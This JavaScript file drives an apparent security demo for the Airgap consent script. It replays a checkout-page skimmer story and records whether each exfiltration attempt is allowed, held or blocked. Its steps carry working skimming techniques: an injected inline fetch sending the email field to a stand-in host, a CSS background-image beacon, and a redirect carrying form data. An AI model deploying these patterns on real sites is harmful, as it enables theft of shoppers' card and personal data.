/**
 * Airgap security demo: the five story steps, the Attack replay, and the
 * result log.
 *
 * The story: a script on a checkout page tries to get card data out. Take one
 * has no Airgap. The next four steps are the attacker's tries against a page
 * with one Airgap script tag.
 *
 * Result rules:
 * - allowed: the request reached the host. On an unapproved host, this is the
 *   risk.
 * - reported: report-only mode. The request succeeded and
 *   airgap.export().sentRequests lists it.
 * - blocked: Airgap held the request and never answered, or the host is in
 *   airgap.export().requests. A timeout means blocked.
 * - held: an approved host whose purpose has no consent. Airgap holds the
 *   request until the shopper opts in.
 * - blocked-by-csp: the browser fired a securitypolicyviolation event for the
 *   host during the step.
 * - error: a network error. This is not an Airgap decision.
 *
 * Every request carries a unique `n` query parameter. That is how a step
 * finds its own request in the violation list, in the resource timing list,
 * and in airgap.export().
 */
(function () {
  const config = window.AIRGAP_DEMO_CONFIG;
  const mode = document.body.getAttribute('data-mode');
  const LOG_KEY = `airgap-demo-log:${mode}`;
  const TIMELINE_KEY = `airgap-demo-timeline:${mode}`;
  const LABELS = {
    allowed: 'Allowed',
    reported: 'Reported',
    blocked: 'Blocked',
    held: 'Held',
    'blocked-by-csp': 'Blocked by CSP',
    error: 'Error',
  };
  const violations = [];
  let running = false;
  let counter = 0;

  document.addEventListener('securitypolicyviolation', (event) => {
    violations.push({ url: event.blockedURI, host: hostOf(event.blockedURI) });
  });

  /**
   * @param selector
   */
  function $(selector) {
    return document.querySelector(selector);
  }

  /**
   * @param ms
   */
  function sleep(ms) {
    return new Promise((resolve) => {
      setTimeout(resolve, ms);
    });
  }

  /**
   * @param url
   */
  function hostOf(url) {
    try {
      return new URL(url, location.href).host;
    } catch (error) {
      return String(url);
    }
  }

  /**
   *
   */
  function readExport() {
    const { airgap } = window;
    if (!airgap || typeof airgap.export !== 'function') return null;
    try {
      return airgap.export();
    } catch (error) {
      return null;
    }
  }

  /**
   * @param items
   * @param context
   */
  function hasRequest(items, context) {
    return (items || []).some(
      (item) =>
        String((item && item.url) || '').indexOf(`n=${context.nonce}`) !== -1,
    );
  }

  /**
   *
   */
  function timeout() {
    return sleep(config.STALL_TIMEOUT_MS).then(() => 'timeout');
  }

  /**
   * Start a step. Records where the violation list stood, so only violations
   * raised during this step count.
   *
   * @param baseUrl
   * @param stepId
   * @param extraParams
   */
  function startContext(baseUrl, stepId, extraParams) {
    counter += 1;
    const nonce = `${Date.now().toString(36)}${counter}`;
    const params = new URLSearchParams(extraParams || {});
    params.set('step', stepId);
    params.set('n', nonce);
    return {
      nonce,
      url: `${baseUrl}?${params.toString()}`,
      host: hostOf(baseUrl),
      since: violations.length,
    };
  }

  /**
   *
   */
  function readForm() {
    return new URLSearchParams(new FormData($('#demo-form')));
  }

  // ---- Consent -------------------------------------------------------------

  /**
   * Returns 'in', 'out', or 'unknown'. The Analytics key is the purpose name
   * in transcend.yml.
   */
  function consentState() {
    const { airgap } = window;
    if (!airgap || typeof airgap.getConsent !== 'function') return 'unknown';
    try {
      const details = airgap.getConsent();
      const value = details && details.purposes && details.purposes.Analytics;
      if (value === true) return 'in';
      if (value === false) return 'out';
    } catch (error) {
      return 'unknown';
    }
    return 'unknown';
  }

  /**
   *
   */
  function renderConsent() {
    const state = $('#consent-state');
    if (!state) return;
    if (mode === 'off') {
      state.textContent = 'No Airgap on this page. Consent is not enforced.';
      return;
    }
    const labels = {
      in: 'Analytics consent: opted in',
      out: 'Analytics consent: opted out',
      unknown: 'Analytics consent: not known (Airgap is not loaded)',
    };
    state.textContent = labels[consentState()];
  }

  /**
   * airgap.setConsent needs a real user event as its first argument, so this
   * runs inside a click handler and passes the click event.
   *
   * @param event
   * @param optIn
   */
  function setAnalyticsConsent(event, optIn) {
    const { airgap } = window;
    if (!airgap || typeof airgap.setConsent !== 'function') return;
    Promise.resolve(airgap.setConsent(event, { Analytics: optIn })).then(() => {
      renderConsent();
    });
  }

  // ---- Result log and timeline ---------------------------------------------

  /**
   * @param key
   */
  function readList(key) {
    try {
      return JSON.parse(sessionStorage.getItem(key) || '[]');
    } catch (error) {
      return [];
    }
  }

  /**
   * @param key
   * @param rows
   */
  function writeList(key, rows) {
    try {
      sessionStorage.setItem(key, JSON.stringify(rows));
    } catch (error) {
      // Storage can be unavailable. The list still shows for this page view.
    }
  }

  /**
   * @param outcome
   * @param text
   */
  function makePill(outcome, text) {
    const pill = document.createElement('span');
    pill.className = `pill pill-${outcome}`;
    pill.textContent = text;
    return pill;
  }

  /**
   * @param row
   */
  function renderRow(row) {
    const tr = document.createElement('tr');
    tr.setAttribute('data-step', row.step);
    tr.setAttribute('data-outcome', row.outcome);
    [row.at, row.title, row.host, LABELS[row.outcome], row.detail].forEach(
      (text, index) => {
        const td = document.createElement('td');
        if (index === 3) {
          td.appendChild(makePill(row.outcome, text));
        } else {
          td.textContent = text;
        }
        tr.appendChild(td);
      },
    );
    $('#log-body').appendChild(tr);
    $('#log-empty').hidden = true;
  }

  /**
   * @param entry
   */
  function renderTimelineEntry(entry) {
    const li = document.createElement('li');
    li.setAttribute('data-step', entry.step);
    li.setAttribute('data-outcome', entry.outcome);
    const when = document.createElement('span');
    when.className = 'timeline-time';
    when.textContent = `${entry.at} (+${entry.offset}s) story ${entry.storyTime}`;
    const title = document.createElement('strong');
    title.textContent = entry.title;
    const host = document.createElement('code');
    host.textContent = entry.host;
    const detail = document.createElement('span');
    detail.className = 'muted';
    detail.textContent = entry.detail;
    [
      when,
      title,
      host,
      makePill(entry.outcome, LABELS[entry.outcome]),
      detail,
    ].forEach((node) => {
      li.appendChild(node);
      li.appendChild(document.createTextNode(' '));
    });
    $('#timeline').appendChild(li);
    $('#timeline-empty').hidden = true;
  }

  /**
   * @param step
   * @param outcome
   * @param detail
   */
  function addRow(step, outcome, detail) {
    const row = {
      at: new Date().toLocaleTimeString(),
      step: step.id,
      title: step.title,
      host: step.host,
      outcome,
      detail,
    };
    const rows = readList(LOG_KEY);
    rows.push(row);
    writeList(LOG_KEY, rows);
    renderRow(row);
  }

  /**
   * @param step
   * @param outcome
   * @param detail
   * @param startedAt
   */
  function addTimelineEntry(step, outcome, detail, startedAt) {
    const entry = {
      at: new Date().toLocaleTimeString(),
      offset: ((Date.now() - startedAt) / 1000).toFixed(1),
      storyTime: step.storyTime,
      step: step.id,
      title: step.title,
      host: step.host,
      outcome,
      detail,
    };
    const entries = readList(TIMELINE_KEY);
    entries.push(entry);
    writeList(TIMELINE_KEY, entries);
    renderTimelineEntry(entry);
  }

  /**
   *
   */
  function clearLog() {
    try {
      sessionStorage.removeItem(LOG_KEY);
      sessionStorage.removeItem(TIMELINE_KEY);
    } catch (error) {
      // Nothing to clear.
    }
    $('#log-body').textContent = '';
    $('#log-empty').hidden = false;
    $('#timeline').textContent = '';
    $('#timeline-empty').hidden = false;
    document.querySelectorAll('.step-result').forEach((node) => {
      node.textContent = '';
    });
    document.querySelectorAll('.where').forEach((node) => {
      node.textContent = '';
    });
  }

  // ---- Classification ------------------------------------------------------

  /**
   * Turn a transport result into an outcome and a plain-language detail.
   *
   * @param step
   * @param context
   * @param transport
   */
  async function classify(step, context, transport) {
    const csp = violations
      .slice(context.since)
      .some((violation) => violation.host === context.host);
    const exported = readExport() || {};
    const held = hasRequest(exported.requests, context);
    if (csp) {
      return [
        'blocked-by-csp',
        `The browser refused the request under the generated Content Security Policy. ${
          held
            ? 'Airgap also listed it.'
            : 'Airgap did not list it, so only the browser caught it.'
        }`,
      ];
    }
    if (transport === 'timeout' || held) {
      if (step.id === 'analytics' && consentState() !== 'in') {
        return [
          'held',
          'The host is approved, but Analytics has no consent. Airgap holds the request until the shopper opts in.',
        ];
      }
      return [
        'blocked',
        held
          ? 'Airgap held the request. It is listed in airgap.export().requests.'
          : `No answer in ${
              config.STALL_TIMEOUT_MS / 1000
            } seconds and no violation event. Airgap holds blocked requests.`,
      ];
    }
    if (transport === 'error') {
      return ['error', 'Network error. This is not an Airgap decision.'];
    }
    if (mode === 'report-only') {
      await sleep(400);
      if (hasRequest((readExport() || {}).sentRequests, context)) {
        return [
          'reported',
          'Airgap saw the request and let it through. See the panel below.',
        ];
      }
    }
    return ['allowed', `The request reached ${context.host}.`];
  }

  // ---- Step runners --------------------------------------------------------

  /**
   * Run a navigation in the test iframe, so the visitor stays on the page.
   * The top-level location behavior is not tested here.
   *
   * @param url
   */
  async function navigateFrame(url) {
    const old = $('#nav-frame');
    const frame = document.createElement('iframe');
    frame.id = 'nav-frame';
    frame.title = 'Navigation test frame';
    old.replaceWith(frame);

    const result = await Promise.race([
      new Promise((resolve) => {
        frame.addEventListener('load', () => {
          try {
            // Same-origin access works while the frame is still about:blank.
            void frame.contentWindow.location.href;
            resolve('stayed');
          } catch (error) {
            // A cross-origin error means the frame reached the target.
            resolve('ok');
          }
        });
        frame.contentWindow.location.href = url;
      }),
      timeout(),
    ]);
    return result === 'ok' ? 'ok' : 'timeout';
  }

  /**
   * Show where a navigation went, with the data in the URL.
   *
   * @param step
   * @param url
   * @param outcome
   */
  function showWhere(step, url, outcome) {
    const box = $(`#step-${step.id} .where`);
    if (!box) return;
    box.textContent = '';
    const parsed = new URL(url);
    const reached = outcome === 'allowed' || outcome === 'reported';
    const lead = document.createElement('p');
    lead.textContent = reached
      ? 'Where it went:'
      : 'Where it tried to go (it did not get there):';
    const target = document.createElement('code');
    target.textContent = `${parsed.host}${parsed.pathname}`;
    lead.appendChild(document.createTextNode(' '));
    lead.appendChild(target);
    const list = document.createElement('ul');
    parsed.searchParams.forEach((value, key) => {
      if (key === 'n' || key === 'step') return;
      const li = document.createElement('li');
      const code = document.createElement('code');
      code.textContent = `${key} = ${value}`;
      li.appendChild(code);
      list.appendChild(li);
    });
    box.appendChild(lead);
    box.appendChild(list);
  }

  /**
   * Take one and try 3 are the same move: set location with form data in the
   * query string. The frame stands in for the top-level page.
   *
   * @param step
   */
  async function runNavigation(step) {
    const context = startContext(
      config.UNAPPROVED_NAV_URL,
      step.id,
      readForm(),
    );
    const transport = await navigateFrame(context.url);
    const outcome = await classify(step, context, transport);
    if (outcome[0] === 'allowed') {
      outcome[1] = `The frame reached ${context.host} with the form data in the URL.`;
    }
    showWhere(step, context.url, outcome[0]);
    return outcome;
  }

  /**
   * Try 1: fetch from an inline script that a compromised tag would add.
   *
   * @param step
   */
  async function runFetch(step) {
    const context = startContext(config.UNAPPROVED_FETCH_URL, step.id, {
      stolen: readForm().get('email'),
    });
    const result = await Promise.race([
      new Promise((resolve) => {
        window.__airgapDemoFetch = resolve;
        const injected = document.createElement('script');
        injected.textContent =
          `fetch(${JSON.stringify(context.url)})` +
          ".then(function(){__airgapDemoFetch('ok')})" +
          ".catch(function(){__airgapDemoFetch('error')})";
        document.head.appendChild(injected);
        injected.remove();
      }),
      timeout(),
    ]);
    if (result === 'error') await sleep(50);
    return classify(step, context, result);
  }

  /**
   * Try 2: inject a stylesheet whose background-image points at an unapproved
   * host.
   *
   * UNPROVEN. The runtime may or may not see a stylesheet image request. The
   * generated CSP should refuse it either way, but that has not run against
   * the real bundle. This step reports what it sees and does not assume:
   * - a securitypolicyviolation event for the host: "blocked by CSP"
   * - the request is in airgap.export().requests: "blocked" by Airgap
   * - the browser fetched the image (a resource timing entry): "allowed"
   * - none of these within the timeout: "blocked", cause not known
   * The ledger test is "Try 2" in the Airgap CISO claims ledger. The skipped
   * Playwright test for block mode asserts the expected outcome.
   *
   * @param step
   */
  async function runStylesheet(step) {
    const context = startContext(config.UNAPPROVED_PIXEL_URL, step.id, {
      stolen: readForm().get('email'),
    });
    const className = `injected-skim-${context.nonce}`;
    const style = document.createElement('style');
    style.textContent = `.${className}{display:block;width:1px;height:1px;background-image:url("${context.url}")}`;
    const probe = document.createElement('div');
    probe.className = className;
    document.head.appendChild(style);
    document.body.appendChild(probe);

    const startedAt = Date.now();
    let transport = 'timeout';
    while (Date.now() - startedAt < config.STALL_TIMEOUT_MS) {
      const fetched = performance
        .getEntriesByType('resource')
        .some((entry) => entry.name.indexOf(`n=${context.nonce}`) !== -1);
      const refused = violations
        .slice(context.since)
        .some((violation) => violation.host === context.host);
      if (fetched) {
        transport = 'ok';
        break;
      }
      if (refused) break;
      await sleep(100);
    }
    style.remove();
    probe.remove();
    return classify(step, context, transport);
  }

  /**
   * Try 4: ask the approved analytics host for a static script file. The
   * host is approved, so only consent decides. No hit goes to a collection
   * endpoint. The response is opaque and never read or run.
   *
   * @param step
   */
  async function runAnalytics(step) {
    const context = startContext(config.ANALYTICS_URL, step.id);
    const result = await Promise.race([
      fetch(context.url, { mode: 'no-cors' }).then(
        () => 'ok',
        () => 'error',
      ),
      timeout(),
    ]);
    if (result === 'error') await sleep(50);
    return classify(step, context, result);
  }

  const STEPS = [
    {
      id: 'take-one',
      storyTime: '02:14',
      label: 'Take one',
      title: 'Take one: send the shopper to a lookalike site',
      host: config.UNAPPROVED_HOST,
      story:
        'The script reads the card form and sets location to a lookalike site, with the card fields in the URL. The Content Security Policy (CSP) has no rule for navigation, so nobody notices.',
      note: `${config.UNAPPROVED_HOST} stands in for the lookalike site.`,
      run: runNavigation,
    },
    {
      id: 'fetch',
      storyTime: '02:14',
      label: 'Try 1',
      title: 'Try 1: fetch to a drop server',
      host: config.UNAPPROVED_HOST,
      story:
        'Take two, the same night with one script tag. The script sends the data to a drop server with fetch. Airgap does not know the host.',
      run: runFetch,
    },
    {
      id: 'stylesheet',
      storyTime: '02:16',
      label: 'Try 2',
      title: 'Try 2: hide the request in a stylesheet',
      host: config.UNAPPROVED_HOST,
      story:
        'The script adds a style rule whose image URL carries the data. This step is unproven: the page reports what the browser and Airgap each saw.',
      run: runStylesheet,
    },
    {
      id: 'navigation',
      storyTime: '02:19',
      label: 'Try 3',
      title: 'Try 3: send the shopper away',
      host: config.UNAPPROVED_HOST,
      story:
        'The script repeats the move from take one: set location, with form data in the URL. Navigation control treats it as a request.',
      run: runNavigation,
    },
    {
      id: 'analytics',
      storyTime: '02:31',
      label: 'Try 4',
      title: 'Try 4: ride the approved analytics host',
      host: config.ANALYTICS_HOST,
      story:
        'The script asks the analytics host the store already uses for a file. The host is approved, so consent decides. The demo fetches a static script and sends no hit.',
      run: runAnalytics,
    },
  ];

  // ---- Running steps -------------------------------------------------------

  /**
   * @param busy
   */
  function setBusy(busy) {
    document.querySelectorAll('button').forEach((button) => {
      const needsAirgap = button.hasAttribute('data-needs-airgap');
      button.disabled = busy || (needsAirgap && !window.airgap);
    });
  }

  /**
   * @param step
   * @param startedAt
   */
  async function runStep(step, startedAt) {
    const result = $(`#step-${step.id} .step-result`);
    result.textContent = 'Running...';
    const [outcome, detail] = await step.run(step);
    addRow(step, outcome, detail);
    if (startedAt) addTimelineEntry(step, outcome, detail, startedAt);
    result.textContent = '';
    result.appendChild(makePill(outcome, LABELS[outcome]));
    result.appendChild(document.createTextNode(` ${detail}`));
    result.setAttribute('data-outcome', outcome);
  }

  /**
   * @param list
   * @param isReplay
   */
  async function runSelected(list, isReplay) {
    if (running) return;
    running = true;
    setBusy(true);
    const startedAt = isReplay ? Date.now() : 0;
    try {
      for (let i = 0; i < list.length; i += 1) {
        await runStep(list[i], startedAt);
        if (isReplay && i < list.length - 1)
          await sleep(config.REPLAY_PAUSE_MS);
      }
    } finally {
      running = false;
      setBusy(false);
    }
    await refreshPanel();
  }

  // ---- Status, tag, and export panel --------------------------------------

  /**
   *
   */
  function renderStatus() {
    const banner = $('#status');
    const { airgap } = window;
    const tag = $('script[src*="/airgap.js"]');
    let kind = 'ok';
    let text = `Airgap${
      airgap && airgap.version ? ` version ${airgap.version}` : ''
    } is loaded and running in ${mode} mode.`;
    if (mode === 'off') {
      kind = 'off';
      text = 'Airgap is not loaded on this page. Nothing is regulated.';
    } else if (tag && /\/cm\/BUNDLE_ID\//.test(tag.getAttribute('src'))) {
      kind = 'warning';
      text =
        'Bundle ID not set. The airgap.js tag still has the BUNDLE_ID placeholder, so Airgap did not load. Run node scripts/set-bundle-id.mjs <bundle-id>.';
    } else if (!readExport()) {
      kind = 'error';
      text =
        'Airgap did not load. Check the consent manager domains and that transcend-cdn.com is reachable.';
    }
    banner.className = `status status-${kind}`;
    banner.setAttribute('data-status', kind);
    banner.textContent = text;
  }

  /**
   * Show the tag as it sits in the page, so the blog and the page agree.
   */
  function renderTag() {
    const tag = $('script[src*="/airgap.js"]');
    $('#script-tag').textContent = tag
      ? tag.outerHTML
      : 'No airgap.js tag on this page.';
  }

  /**
   * @param selector
   * @param items
   * @param emptyText
   */
  function renderList(selector, items, emptyText) {
    const list = $(selector);
    list.textContent = '';
    const entries = items && items.length ? items : [null];
    entries.forEach((item) => {
      const li = document.createElement('li');
      if (item) {
        const code = document.createElement('code');
        code.textContent = String(item.url);
        li.appendChild(code);
        li.appendChild(document.createTextNode(` ${item.type || ''}`));
      } else {
        li.className = 'muted';
        li.textContent = emptyText;
      }
      list.appendChild(li);
    });
  }

  /**
   *
   */
  async function refreshPanel() {
    await sleep(150);
    const exported = readExport();
    const none = exported ? 'Nothing yet.' : 'Airgap is not loaded.';
    renderList('#sent-requests', exported && exported.sentRequests, none);
    renderList('#held-requests', exported && exported.requests, none);
    renderConsent();
  }

  // ---- Step cards and anchors ----------------------------------------------

  /**
   * @param step
   */
  function renderStepCard(step) {
    const card = document.createElement('article');
    card.className = 'step';
    card.id = `step-${step.id}`;
    card.setAttribute('data-step', step.id);

    const heading = document.createElement('h3');
    heading.textContent = step.title;
    const story = document.createElement('p');
    story.className = 'story';
    const lead = document.createElement('strong');
    lead.textContent = 'What happened in the story: ';
    story.appendChild(lead);
    story.appendChild(document.createTextNode(step.story));
    card.appendChild(heading);
    card.appendChild(story);
    if (step.note) {
      const note = document.createElement('p');
      note.className = 'muted';
      note.textContent = step.note;
      card.appendChild(note);
    }

    const buttons = document.createElement('div');
    buttons.className = 'buttons';
    const run = document.createElement('button');
    run.setAttribute('data-step-run', step.id);
    run.textContent = `${step.label}: run this step`;
    run.addEventListener('click', () => {
      runSelected([step], false);
    });
    buttons.appendChild(run);
    if (step.id === 'analytics') {
      [
        ['consent-in', 'Opt in to Analytics', true],
        ['consent-out', 'Opt out of Analytics', false],
      ].forEach(([id, text, optIn]) => {
        const button = document.createElement('button');
        button.id = id;
        button.className = 'secondary';
        button.setAttribute('data-needs-airgap', '');
        button.textContent = text;
        button.addEventListener('click', (event) => {
          setAnalyticsConsent(event, optIn);
        });
        buttons.appendChild(button);
      });
      const state = document.createElement('span');
      state.id = 'consent-state';
      state.className = 'muted';
      buttons.appendChild(state);
    }
    card.appendChild(buttons);

    const result = document.createElement('p');
    result.className = 'step-result';
    result.setAttribute('role', 'status');
    card.appendChild(result);
    const where = document.createElement('div');
    where.className = 'where';
    card.appendChild(where);
    $('#steps').appendChild(card);
  }

  /**
   * Read #step=<id>&run=on. Select the step. Run it when run=on.
   */
  function applyAnchor() {
    const params = new URLSearchParams(location.hash.replace(/^#/, ''));
    const step = STEPS.filter(
      (candidate) => candidate.id === params.get('step'),
    )[0];
    document.querySelectorAll('.step').forEach((card) => {
      card.classList.remove('step-active');
    });
    if (!step) return;
    const card = $(`#step-${step.id}`);
    card.classList.add('step-active');
    card.scrollIntoView({ block: 'center' });
    if (params.get('run') === 'on') runSelected([step], false);
  }

  // ---- Start ---------------------------------------------------------------

  STEPS.forEach(renderStepCard);
  renderStatus();
  renderTag();
  readList(LOG_KEY).forEach(renderRow);
  $('#log-empty').hidden = readList(LOG_KEY).length > 0;
  readList(TIMELINE_KEY).forEach(renderTimelineEntry);
  $('#timeline-empty').hidden = readList(TIMELINE_KEY).length > 0;
  setBusy(false);
  refreshPanel();
  applyAnchor();

  $('#replay').addEventListener('click', () => {
    $('#timeline').textContent = '';
    writeList(TIMELINE_KEY, []);
    runSelected(STEPS, true);
  });
  $('#clear-log').addEventListener('click', clearLog);
  $('#refresh-panel').addEventListener('click', refreshPanel);
  window.addEventListener('hashchange', applyAnchor);
})();
